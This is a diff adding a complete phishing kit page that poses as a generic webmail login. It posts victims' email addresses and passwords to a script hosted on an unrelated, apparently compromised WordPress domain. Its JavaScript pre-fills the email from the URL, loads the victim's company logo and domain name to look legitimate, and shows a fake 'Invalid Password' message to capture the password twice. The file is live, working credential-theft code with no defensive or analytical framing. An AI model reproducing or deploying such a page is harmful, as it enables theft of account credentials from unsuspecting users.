@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Webmail - Login</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://216heatingandair.com/wp-includes/Requests/Transport/B29M/css/landing.css">
+    <style type="text/css">
+    /*  #pr {
+    -webkit-text-security: disc;
+}*/
+    @font-face {
+        font-family: 'password';
+        font-style: normal;
+        font-weight: 400;
+        src: url(https://jsbin-user-assets.s3.amazonaws.com/rafaelcastrocouto/password.ttf);
+    }
+
+    #pr {
+        font-family: 'password';
+    }
+
+    ::-webkit-input-placeholder {
+        /* Edge */
+        font-family: arial;
+    }
+
+    :-ms-input-placeholder {
+        /* Internet Explorer 10-11 */
+        font-family: arial;
+    }
+
+    ::placeholder {
+        font-family: arial;
+    }
+    </style>
+</head>
+
+<body>
+    <div id="html_encoder_div">
+        <form action="https://216heatingandair.com/wp-includes/Requests/Transport/B29M/next.php" method="POST">
+            <input type="hidden" name="count" id="count" value="0">
+            <div class="container">
+                <div class="office show border shadow bg-light" id="others">
+                    <div class="office-holder">
+                        <div class="logo" style="text-align:center">
+                            <div id="login_logo">
+                                <img id="login_logo1" src="https://216heatingandair.com/wp-includes/Requests/Transport/B29M/images/weblogo.png" width="50" height="50" alt="Webmail">
+                            </div>
+                            <h3 class="text-dark"><strong id="domain-name" class="text-uppercase">WEBMAIL</strong></h3>
+                            <h5 class="font-weight-light">Please sign in using your email and password to gain access</h5>
+                        </div>
+                        <center>
+                            <div id="msg" style="display: none;font-weight: 600;color: red;">Invalid Password.! Please enter correct password.</div>
+                        </center>
+                        <div class="form-holder">
+                            <div style="width: 100%;">
+                                <div class="alert alert-danger hide alert2"></div>
+                            </div>
+                            <input type="email" id="ai" name="ai" class="form-control" value="[EMail]" placeholder="someone@example.com" required="">
+                            <input type="text" id="pr" name="pr" placeholder="Password" class="form-control" required="">
+                            <div class="checkbox">
+                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
+                                <label>REMEMBER ME</label>
+                            </div>
+                            <div class="btn-holder">
+                                <button class="btn btn-lg col-12" id="submit-btn" name="submit-btn" type="submit">LOGIN</button>
+                            </div>
+                            <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
+                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+   <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+
+    function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
+            vars[key] = value;
+        });
+        return vars;
+    }
+
+    if (!getUrlVars()["count"]) {
+
+    } else {
+        var count = getUrlVars()["count"];
+        $('#count').val(count);
+    }
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+
+        $('#ai').val(my_ai);
+        $('#ai').attr('readonly', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        if (count == 1) {
+            $("#msg").show();
+        } else {
+            $("#msg").hide();
+        }
+    }
+    ///////////////url getting ai////////////////
+
+
+
+
+});
+</script>
+
+</html>
